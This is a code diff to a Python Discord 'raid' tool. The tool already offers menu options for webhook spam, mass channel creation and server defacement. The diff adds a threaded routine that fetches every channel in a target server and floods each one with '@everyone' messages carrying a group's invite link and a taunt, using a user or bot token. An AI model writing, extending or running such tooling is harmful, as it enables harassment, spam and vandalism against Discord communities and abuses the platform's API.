@@ -2,7 +2,6 @@ import requests
 from time import sleep, strftime
 from colorama import init, Fore
 import concurrent.futures
-from getpass import getpass
 
 import discord
 
@@ -61,6 +60,7 @@ def raid_server_action(server_id: str) -> None:
                     {Fore.RED}3. spam channels with webhooks.
                     {Fore.RED}4. change server    appearance.
                     {Fore.RED}5. make       new     channels.
+                    {Fore.RED}6. spam channels with bot-user.
                     {Fore.RED}0. exit     the        program.
     ''')
     action = input(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}select option: ')
@@ -160,7 +160,7 @@ def raid_server_action(server_id: str) -> None:
     if action == "5":
         url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
         
-        for x in range(50):
+        for x in range(30):
             try:
                 request = requests.post(url, headers=headers, json={
                     'name': '𝔟𝔶𝔭𝔞𝔰𝔰𝔢𝔡-𝔟𝔶-𝔫𝔦𝔵𝔰𝔮𝔲𝔞𝔡',
@@ -174,6 +174,36 @@ def raid_server_action(server_id: str) -> None:
 
         raid_server_action(server_id)
 
+    if action == "6":
+        channels_list = []
+        url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
+        
+        channels_req = requests.get(url, headers=headers)
+        if channels_req.status_code == 200:
+            channels = channels_req.json()
+            for channel in channels:
+                channels_list.append(channel['id'])
+
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                executor.map(lambda channel: send_message(channel, headers), channels_list)
+
+        raid_server_action(server_id)
+
+def send_message(channel_id, headers):
+    try:
+        print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> sended message on channel {channel_id}')
+        for _ in range(10):
+            sleep(0.5)
+            requests.post(
+                f'https://discord.com/api/v9/channels/{channel_id}/messages',
+                headers=headers,
+                json={
+                    'content': '@everyone https://discord.gg/nixakanazis han sido domados por la nixsquad.'
+                }
+            )
+            sleep(0.1)
+    except Exception as e:
+        print(f"Error sending message to channel {channel_id}: {e}")
 
 def get_server_info(token: str, guild_id: int) -> dict:
     headers = {
@@ -225,7 +255,7 @@ def get_token_info(token: str) -> dict:
     except:
         return None
     
-def get_token_guilds(token: str) -> dict:
+def get_token_guilds(token: str) -> tuple:
     headers = {
         'Authorization': f'{"Bot " if not is_user_token else ""}{token}',
         'Content-Type': 'application/json'
